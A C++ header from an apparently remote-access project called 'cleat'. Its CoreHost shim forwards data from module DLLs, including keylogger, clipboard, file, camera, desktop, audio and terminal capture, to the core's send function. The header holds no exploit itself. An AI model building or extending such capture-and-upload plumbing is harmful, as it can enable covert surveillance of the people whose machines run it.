#pragma once
// ModuleHost.hpp — 模块侧 IServiceHost shim(阶段 C 模块协议 v2)
//
// 核心里的 ServiceManager 既是服务注册表又是 IServiceHost, 但它是核心单例,
// 模块 DLL 里引用它会跨 CRT 传 C++ 对象, 破 ModuleManager.hpp 的纯 C 契约。
// 本 shim 用 ModInit 注入的 CleatCoreApi 顶替它 —— 跨边界的只剩纯 C 指针,
// 现有的 *Service.cpp / *Provider.cpp / PlatformWin_* 一行不改编入模块。
//
//   - SendData 只负责透传。Service 经 SetDataCallback 拿到的帧已是完整 JSON
//     (Provider 用 Packet::Push 产出, 如 FileChangeData/ClipboardData), 模块侧
//     不重新包帧、不加头, 否则与静态路径产出的帧形不一致。
//   - IsNetworkConnected 恒 true。核心网络状态模块侧不可见( 已接受);
//     现有三模块(ClipboardMonitor/FileMonitor/Keylog)从不调用它,
//     仅 CameraStream 使用 —— 拆摄像头时再回来处理这一项。
//   - 无低带宽检查。模块侧无 selector_ 可见, 高带宽服务在模块内不被自动停。
#ifndef _WIN32
#error ModuleHost.hpp 仅供 Windows 模块 DLL 使用
#endif

#include "Common/Protocol/ModuleApi.hpp"
#include "Common/Protocol/IServiceHost.hpp"
#include <cstdint>
#include <string>
#include <vector>

namespace cleat {

    class CoreHost : public IServiceHost {
    public:
        explicit CoreHost(const CleatCoreApi* api = nullptr) : api_(api) {}

        bool IsNetworkConnected() const override {
            //  订正: 此前**硬编码 true** —— 模块侧看到的链路状态永远是"通"。
            // 现在如实查(宿主由装配方注入提供者; 未注入时返回 0 = 未连接, 不谎报)。
            return (api_ && api_->is_network_connected) ? (api_->is_network_connected() != 0) : false;
        }

        /// v3 只读查询(模块侧安全封装: 旧核心上返回中性值)
        uint64_t SessionId() const {
            return (api_ && api_->get_session_id) ? api_->get_session_id() : 0;
        }
        uint64_t Epoch() const {
            return (api_ && api_->get_epoch) ? api_->get_epoch() : 0;
        }

        void SendData(const std::vector<uint8_t>& data) override {
            if (!api_ || !api_->send || data.empty()) return;
            // 上报入口自 起**只有带长度的形态**(旧 `send(const char*)` 已从 ABI 删除),
            // 故这里不可能再退回 strlen 取长 ——  的根因在类型上被切断。
            api_->send(data.data(), static_cast<uint32_t>(data.size()));
        }

        /**
         * 模块内 Service 组件使用旧框架 DataCallback 上报(SetDataCallback),
         * 模块化后 ServiceManager 不再注入该回调 —— 若 ModInit 不显式接入,
         * Provider 产出的事件(FileChangeData/ClipboardData/KeylogData/AudioData/
         * TerminalOutput/CameraStreamData/DesktopStreamData)会在模块内静默丢弃
         * (实测: 模块启动正常、上报零到达)。本方法一行把 Service 的 DataCallback
         * 接到 api->send 透传, 与静态路径 ServiceManager::SendData 行为一致。
         */
        template <typename Service>
        void AttachData(Service& svc) {
            svc.SetDataCallback([this](const std::vector<uint8_t>& data) { SendData(data); });
        }

    private:
        const CleatCoreApi* api_ = nullptr;
    };

} // namespace cleat
